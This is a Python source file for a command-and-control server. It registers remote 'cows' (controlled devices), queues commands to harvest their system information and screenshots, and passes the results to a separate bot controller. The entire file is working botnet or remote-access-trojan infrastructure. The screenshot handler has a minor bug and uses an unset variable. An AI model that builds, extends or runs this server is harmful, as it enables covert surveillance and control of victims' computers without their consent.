import socket

# Server will listen on all interfaces at this port
ip = '0.0.0.0'
port = 4570

# Store seen device names and IPs
DeviceIDList = []
DeviceIPList = []

# Commands waiting to be sent to a specific device
pending_command = {}

# Responses sent back from clients
# Format: { device_name: { command_name: response_str } }
response_buffer = {}

# Set up and start the TCP server
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server_socket.bind((ip, port))
server_socket.listen(5)

print(f"[+] Server listening on {ip}:{port}")

while True:
    # Accept an incoming client connection
    client_socket, address = server_socket.accept()
    msg = client_socket.recv(4096).decode()

    lines = msg.splitlines()  # Split message by lines

    # ========== Handle :CLIENTPING ==========
    if msg.startswith(":CLIENTPING"):
        name = lines[1]           # Device name
        ip_addr = lines[2]        # IP address of the device
        #print(f"\n[>] Received ping request from {ip_addr}.")

        # Register new device if not already tracked
        if name not in DeviceIDList:
            DeviceIDList.append(name)
            DeviceIPList.append(ip_addr)
            print(f"[+] New cow: {name} at {ip_addr}")

        # Check if there's a pending command for this device
        if pending_command.get(name):
            command = pending_command.pop(name)  # Remove from queue
            client_socket.send(command.encode())
        else:
            client_socket.send(b":NOOP")  # No command to run

    # ========== Handle :PCINFO ==========
    elif msg.startswith(":PCINFO"):
        name = lines[1]               # Device name
        info = "\n".join(lines[2:])   # Skip name and join the rest

        print(f"\n[>] Received PCINFO from {name}.")
        print(info)

        # Store the response in the buffer for later retrieval
        if name not in response_buffer:
            response_buffer[name] = {}
        response_buffer[name]["GETINFO"] = info

    # ========== Handle :SCREENSHOT ==========
    elif msg.startswith(":SCREENSHOT"):
        link = lines[1] #link

        print(f"\n[>] Received SCREENSHOT from {name}.")
        print(link)

        # Store the response in the buffer for later retrieval
        if link not in response_buffer:
            response_buffer[link] = {}
        response_buffer[link]["GETSCREENSHOT"] = link

    # ========== Handle :GETINFO ==========
    elif msg.startswith(":GETINFO"):
        target = lines[1]  # Name of the target device
        pending_command[target] = ":COMMAND :GETINFO"  # Queue it
        print(f"[+] Queued :GETINFO for {target}")

    elif msg.startswith(":GETSCREENSHOT"):
        target = lines[1]  # Name of the target device
        pending_command[target] = ":COMMAND :GETSCREENSHOT"  # Queue it
        print(f"[+] Queued :GETSCREENSHOT for {target}")

    # ========== Handle :LISTCOWS ==========
    elif msg.startswith(":LISTCOWS"):
        print(DeviceIDList)  # Just log it; actual response sent to bot
        cows_list = "\n".join(DeviceIDList)  # Join the list into a string, separated by new lines
        client_socket.sendall(cows_list.encode())  # Send the list to the bot.py

    # ========== Handle :FETCHRESPONSE ==========
    elif msg.startswith(":FETCHRESPONSE"):
        # Format: :FETCHRESPONSE\n<target>\n<command>
        target = lines[1]
        command = lines[2]

        # Check if a response exists for that command
        if target in response_buffer and command in response_buffer[target]:
            client_socket.sendall(response_buffer[target][command].encode())
            # Optionally remove the response after it's been fetched
            del response_buffer[target][command]
        else:
            client_socket.send(b"No response available yet.\n")

    # Close connection to this client
    client_socket.close()
